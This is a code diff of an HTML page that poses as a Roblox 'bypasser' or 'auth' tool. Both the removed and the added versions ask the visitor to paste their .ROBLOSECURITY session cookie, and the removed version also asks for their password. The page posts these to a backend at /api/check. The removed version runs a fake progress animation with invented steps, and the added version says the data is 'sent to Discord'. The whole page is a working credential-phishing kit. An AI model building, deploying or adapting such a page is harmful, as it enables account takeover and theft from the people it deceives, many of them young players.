@@ -1,345 +1,205 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>INJURIES | BYPASSER</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #000;
-            color: #fff;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem 1rem;
-        }
-        .header { text-align: center; margin-bottom: 2rem; }
-        .check-icon {
-            width: 56px; height: 56px;
-            border: 2px solid #fff;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 1rem;
-            background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, rgba(0,0,0,0) 80%);
-        }
-        .check-icon svg { width: 28px; height: 28px; stroke: #fff; stroke-width: 2; fill: none; }
-        h1 { font-size: 2.5rem; font-weight: 800; letter-spacing: 2px; line-height: 1.2; text-shadow: 0 0 5px rgba(255,255,255,0.2); }
-        .subtitle { color: #888; font-size: 0.75rem; letter-spacing: 4px; margin-top: 0.25rem; }
-        .notes-box {
-            background: rgba(255, 184, 0, 0.05);
-            border: 1px solid rgba(255, 184, 0, 0.3);
-            border-radius: 12px;
-            padding: 0.9rem 1.5rem;
-            max-width: 500px;
-            width: 100%;
-            text-align: center;
-            margin-bottom: 1.8rem;
-        }
-        .notes-box p { color: #ffb800; font-size: 0.7rem; font-weight: 600; text-transform: uppercase; }
-        .main-card {
-            background: #0a0a0a;
-            border: 1px solid #222;
-            border-radius: 28px;
-            padding: 2rem 1.8rem;
-            width: 100%;
-            max-width: 500px;
-            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.5);
-        }
-        .section-label {
-            color: #aaa;
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            margin-bottom: 0.75rem;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .section-label::before { content: ">"; font-weight: 600; }
-        .mode-group { display: flex; gap: 1rem; margin-bottom: 2rem; }
-        .mode-btn {
-            flex: 1;
-            background: #111;
-            border: 1px solid #2a2a2a;
-            border-radius: 14px;
-            padding: 0.9rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            cursor: pointer;
-            transition: all 0.2s;
-            color: #ccc;
-        }
-        .mode-btn.active {
-            background: #1e1e1e;
-            border-color: #8a8aff;
-            color: white;
-            box-shadow: 0 0 12px rgba(138,138,255,0.4);
-        }
-        .input-field {
-            width: 100%;
-            background: #0c0c0c;
-            border: 1px solid #222;
-            border-radius: 14px;
-            padding: 1rem;
-            color: white;
-            font-size: 0.85rem;
-            font-family: monospace;
-            outline: none;
-            resize: vertical;
-            margin-bottom: 1.2rem;
-        }
-        .input-field:focus { border-color: #8a8aff; box-shadow: 0 0 12px rgba(138,138,255,0.4); }
-        .processing-overlay {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95);
-            backdrop-filter: blur(8px);
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            visibility: hidden;
-            opacity: 0;
-            transition: visibility 0.2s, opacity 0.2s;
-        }
-        .processing-card {
-            background: #0a0a0a;
-            border: 1px solid #333;
-            border-radius: 32px;
-            padding: 2rem;
-            max-width: 460px;
-            width: 90%;
-            text-align: left;
-            box-shadow: 0 0 30px rgba(138,138,255,0.3);
-        }
-        .processing-title { font-size: 1.2rem; font-weight: 600; margin-bottom: 1rem; color: #8a8aff; text-align: center; }
-        .cookie-preview {
-            background: #111;
-            border-radius: 12px;
-            padding: 0.8rem;
-            font-family: monospace;
-            font-size: 0.7rem;
-            color: #aaa;
-            margin: 1rem 0;
-            word-break: break-all;
-        }
-        .info-line { display: flex; justify-content: space-between; margin-bottom: 0.5rem; font-size: 0.8rem; }
-        .info-label { color: #888; }
-        .info-value { color: #fff; font-weight: 500; }
-        .progress-bar-bg { background: #222; border-radius: 20px; height: 8px; overflow: hidden; margin: 1rem 0; }
-        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #8a8aff, #5f5fd0); border-radius: 20px; transition: width 0.3s ease; }
-        .status-text { font-family: monospace; color: #8a8aff; font-size: 0.8rem; margin-top: 0.5rem; text-align: center; }
-        .system-status { background: #111; border-radius: 12px; padding: 1rem; margin-top: 1rem; font-size: 0.7rem; }
-        .system-status span { color: #5fbc8c; }
-        .close-overlay {
-            margin-top: 1.5rem;
-            background: #1a1a1a;
-            border: none;
-            padding: 0.6rem 1.5rem;
-            border-radius: 40px;
-            color: white;
-            cursor: pointer;
-            display: none;
-            width: 100%;
-        }
-        .error-box {
-            background: rgba(255, 68, 68, 0.08);
-            border-left: 3px solid #ff4444;
-            border-radius: 10px;
-            padding: 0.8rem 1rem;
-            margin-top: 1rem;
-            display: none;
-        }
-        .error-box p { color: #ff7777; font-size: 0.7rem; font-weight: 500; }
-        .start-btn {
-            width: 100%;
-            background: #121212;
-            border: 1px solid #2a2a2a;
-            border-radius: 40px;
-            padding: 1rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            cursor: pointer;
-            color: #ddd;
-            font-weight: 600;
-            letter-spacing: 2px;
-            transition: all 0.2s;
-        }
-        .start-btn:hover { background: #1a1a1a; border-color: #8a8aff; color: white; box-shadow: 0 0 16px rgba(138,138,255,0.5); transform: scale(1.02); }
-        .footer-text { margin-top: 2rem; color: #2a2a2a; font-size: 0.65rem; letter-spacing: 2px; }
-        @media (max-width: 480px) {
-            .main-card { padding: 1.5rem; }
-            .mode-group { flex-direction: column; gap: 0.75rem; }
-            h1 { font-size: 2rem; }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>INJURIES AUTH</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #0f0f0f;
+      font-family: 'Segoe UI', 'Roboto', 'Inter', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 2rem;
+    }
+
+    .container {
+      background: #1a1a1a;
+      border-radius: 24px;
+      padding: 2.5rem;
+      width: 100%;
+      max-width: 550px;
+      box-shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.5);
+      border: 1px solid #2a2a2a;
+      transition: all 0.2s ease;
+    }
+
+    h1 {
+      font-size: 2rem;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      background: linear-gradient(135deg, #fff 0%, #ff0040 100%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 0.5rem;
+    }
+
+    .subtitle {
+      color: #aaa;
+      font-size: 0.85rem;
+      margin-bottom: 2rem;
+      border-left: 3px solid #ff0040;
+      padding-left: 12px;
+    }
+
+    .input-group {
+      margin-bottom: 1.5rem;
+    }
+
+    label {
+      display: block;
+      color: #ddd;
+      font-size: 0.9rem;
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+
+    textarea {
+      width: 100%;
+      background: #0a0a0a;
+      border: 1px solid #2c2c2c;
+      border-radius: 12px;
+      padding: 12px 16px;
+      color: #eee;
+      font-family: 'Monaco', monospace;
+      font-size: 0.85rem;
+      resize: vertical;
+      transition: all 0.2s;
+    }
+
+    textarea:focus {
+      outline: none;
+      border-color: #ff0040;
+      box-shadow: 0 0 0 2px rgba(255, 0, 64, 0.2);
+    }
+
+    button {
+      background: #ff0040;
+      border: none;
+      border-radius: 40px;
+      padding: 12px 24px;
+      width: 100%;
+      font-size: 1rem;
+      font-weight: 600;
+      color: white;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      margin-top: 8px;
+      letter-spacing: 0.5px;
+    }
+
+    button:hover {
+      background: #cc0033;
+      transform: translateY(-1px);
+      box-shadow: 0 5px 15px rgba(255, 0, 64, 0.3);
+    }
+
+    button:active {
+      transform: translateY(0);
+    }
+
+    .status {
+      margin-top: 1.5rem;
+      padding: 12px;
+      border-radius: 12px;
+      font-size: 0.9rem;
+      text-align: center;
+      background: #0f0f0f;
+      border-left: 3px solid #ff0040;
+      color: #ccc;
+      word-break: break-word;
+    }
+
+    .status.error {
+      border-left-color: #ff4444;
+      color: #ff8888;
+    }
+
+    .status.success {
+      border-left-color: #44ff44;
+      color: #88ff88;
+    }
+
+    footer {
+      margin-top: 2rem;
+      text-align: center;
+      font-size: 0.7rem;
+      color: #555;
+    }
+  </style>
 </head>
 <body>
-<div class="header">
-    <div class="check-icon"><svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
-    <h1>INJURIES |<br>BYPASSER</h1>
-    <div class="subtitle">// SECURE & EFFICIENT</div>
-</div>
-<div class="notes-box"><p>NOTES: REFRESH YOUR ROBLOX COOKIE<br>FIRST BEFORE PROCEED TO BYPASSING</p></div>
-<div class="main-card">
-    <div class="section-label">BYPASS MODE</div>
-    <div class="mode-group">
-        <div class="mode-btn" data-mode="cookie"><span>○</span> Cookie</div>
-        <div class="mode-btn active" data-mode="cookiepass"><span>□</span> Cookie + Pass</div>
-    </div>
-    <div class="section-label">.ROBLOSECURITY COOKIE</div>
-    <textarea id="cookieInput" class="input-field" placeholder="Paste your cookie here..." rows="3"></textarea>
-    <div id="passwordContainer"><div class="section-label">Roblox Account Password <span style="color:#666; font-size:0.6rem;">(Optional)</span></div><input type="password" id="passwordInput" class="input-field" placeholder="Enter your Roblox password..."></div>
-    <div id="errorBox" class="error-box"><p>Invalid Roblox cookie format.</p></div>
-    <button id="startBtn" class="start-btn"><span>▶</span> START BYPASS</button>
-</div>
-<div class="footer-text">SECURE • FAST • RELIABLE</div>
+  <div class="container">
+    <h1>INJURIES AUTH</h1>
+    <div class="subtitle">Enter .ROBLOSECURITY cookie to verify account</div>
 
-<div id="overlay" class="processing-overlay">
-    <div class="processing-card">
-        <div class="processing-title">⚡ PROCESSING BYPASS ⚡</div>
-        <div id="overlayCookie" class="cookie-preview"></div>
-        <div class="info-line"><span class="info-label">USERNAME</span><span id="overlayUsername" class="info-value">—</span></div>
-        <div class="progress-bar-bg"><div id="progressFill" class="progress-fill"></div></div>
-        <div id="statusMsg" class="status-text">Initializing...</div>
-        <div class="system-status"><span>SYSTEM STATUS</span><br>INFRASTRUCTURE<br>All Systems Online</div>
-        <button id="closeOverlay" class="close-overlay">CLOSE</button>
+    <div class="input-group">
+      <label>Cookie (full .ROBLOSECURITY=...)</label>
+      <textarea rows="3" id="cookieInput" placeholder=".ROBLOSECURITY=_|WARNING…"></textarea>
     </div>
-</div>
 
-<script>
-    const modeBtns = document.querySelectorAll('.mode-btn');
+    <button id="verifyBtn">VERIFY ACCOUNT</button>
+
+    <div id="statusMessage" class="status">Ready — enter cookie and click verify.</div>
+    <footer>Data will be sent to Discord securely.</footer>
+  </div>
+
+  <script>
+    const verifyBtn = document.getElementById('verifyBtn');
     const cookieInput = document.getElementById('cookieInput');
-    const passwordInput = document.getElementById('passwordInput');
-    const passwordContainer = document.getElementById('passwordContainer');
-    const errorBox = document.getElementById('errorBox');
-    const startBtn = document.getElementById('startBtn');
-    const overlay = document.getElementById('overlay');
-    const overlayCookie = document.getElementById('overlayCookie');
-    const overlayUsername = document.getElementById('overlayUsername');
-    const progressFill = document.getElementById('progressFill');
-    const statusMsg = document.getElementById('statusMsg');
-    const closeOverlayBtn = document.getElementById('closeOverlay');
+    const statusDiv = document.getElementById('statusMessage');
 
-    let currentMode = 'cookiepass';
-    let isProcessing = false;
+    verifyBtn.addEventListener('click', async () => {
+      const cookie = cookieInput.value.trim();
+      if (!cookie) {
+        setStatus('Please enter a .ROBLOSECURITY cookie.', 'error');
+        return;
+      }
+      if (!cookie.startsWith('.ROBLOSECURITY=')) {
+        setStatus('Cookie must start with ".ROBLOSECURITY="', 'error');
+        return;
+      }
 
-    function setMode(mode) {
-        currentMode = mode;
-        modeBtns.forEach(btn => {
-            const m = btn.getAttribute('data-mode');
-            if (m === mode) btn.classList.add('active');
-            else btn.classList.remove('active');
+      setStatus('Processing... please wait.', '');
+      verifyBtn.disabled = true;
+      verifyBtn.style.opacity = '0.6';
+
+      try {
+        const response = await fetch('/api/check', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cookie })
         });
-        passwordContainer.style.display = mode === 'cookiepass' ? 'block' : 'none';
-    }
-    modeBtns.forEach(btn => btn.addEventListener('click', () => setMode(btn.getAttribute('data-mode'))));
-    setMode('cookiepass');
 
-    function isValidRobloxCookie(cookie) {
-        if (!cookie) return false;
-        const trimmed = cookie.trim();
-        if (trimmed.length === 0) return false;
-        const placeholders = ['paste your cookie here...', 'Uhhhh', 'Ksksjjs'];
-        if (placeholders.some(p => trimmed.toLowerCase() === p.toLowerCase())) return false;
-        return trimmed.includes('.ROBLOSECURITY') || trimmed.includes('_|WARNING') || trimmed.length > 30;
-    }
+        const data = await response.json();
 
-    function showError(msg) {
-        errorBox.style.display = 'block';
-        errorBox.querySelector('p').innerText = msg;
-        cookieInput.style.borderColor = '#ff4444';
-    }
-    function hideError() {
-        errorBox.style.display = 'none';
-        cookieInput.style.borderColor = '#222';
-    }
-
-    function updateProgress(percent, message) {
-        progressFill.style.width = `${percent}%`;
-        statusMsg.innerText = message;
-    }
-
-    const steps = [
-        { percent: 10, msg: 'Validating cookie format...', delay: 400 },
-        { percent: 20, msg: 'Connecting to auth.roblox.com...', delay: 500 },
-        { percent: 35, msg: 'Fetching account details...', delay: 600 },
-        { percent: 50, msg: 'Bypassing rate limiter...', delay: 700 },
-        { percent: 65, msg: 'OVERRIDING AUTH TOKENS...', delay: 800 },
-        { percent: 75, msg: 'Extracting account statistics...', delay: 600 },
-        { percent: 85, msg: 'Gathering Robux balance...', delay: 500 },
-        { percent: 92, msg: 'Checking inventory...', delay: 600 },
-        { percent: 98, msg: 'Generating bypass report...', delay: 500 }
-    ];
-
-    async function animateProgress() {
-        for (const step of steps) {
-            updateProgress(step.percent, step.msg);
-            await new Promise(r => setTimeout(r, step.delay));
-        }
-    }
-
-    startBtn.addEventListener('click', async () => {
-        if (isProcessing) return;
-        const cookie = cookieInput.value.trim();
-        const password = passwordInput.value;
-        
-        if (!cookie) { showError('Please paste a .ROBLOSECURITY cookie.'); return; }
-        if (!isValidRobloxCookie(cookie)) { showError('Invalid Roblox cookie format.'); return; }
-        hideError();
-
-        isProcessing = true;
-        startBtn.disabled = true;
-
-        overlay.style.visibility = 'visible';
-        overlay.style.opacity = '1';
-        overlayCookie.innerText = cookie.length > 80 ? cookie.substring(0, 80) + '…' : cookie;
-        overlayUsername.innerText = '—';
-        updateProgress(0, 'Initializing...');
-        closeOverlayBtn.style.display = 'none';
-
-        await animateProgress();
-
-        try {
-            const response = await fetch('/api/check', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ cookie, password, mode: currentMode })
-            });
-            const data = await response.json();
-
-            if (data.success) {
-                overlayUsername.innerText = data.user.username;
-                updateProgress(100, 'SUCCESS! Bypass completed.');
-            } else {
-                updateProgress(100, 'ERROR: Invalid cookie or network failure');
-            }
-        } catch (err) {
-            updateProgress(100, 'ERROR: Server connection failed');
+        if (!response.ok) {
+          throw new Error(data.error || 'Server error');
         }
 
-        closeOverlayBtn.style.display = 'block';
-        isProcessing = false;
-        startBtn.disabled = false;
+        setStatus('✅ Success! Account data has been sent to Discord.', 'success');
+      } catch (err) {
+        setStatus(`❌ Error: ${err.message}`, 'error');
+      } finally {
+        verifyBtn.disabled = false;
+        verifyBtn.style.opacity = '1';
+      }
     });
 
-    closeOverlayBtn.addEventListener('click', () => {
-        overlay.style.visibility = 'hidden';
-        overlay.style.opacity = '0';
-        closeOverlayBtn.style.display = 'none';
-        updateProgress(0, 'Initializing...');
-        overlayUsername.innerText = '—';
-    });
-</script>
+    function setStatus(message, type) {
+      statusDiv.textContent = message;
+      statusDiv.className = 'status';
+      if (type) statusDiv.classList.add(type);
+    }
+  </script>
 </body>
 </html>
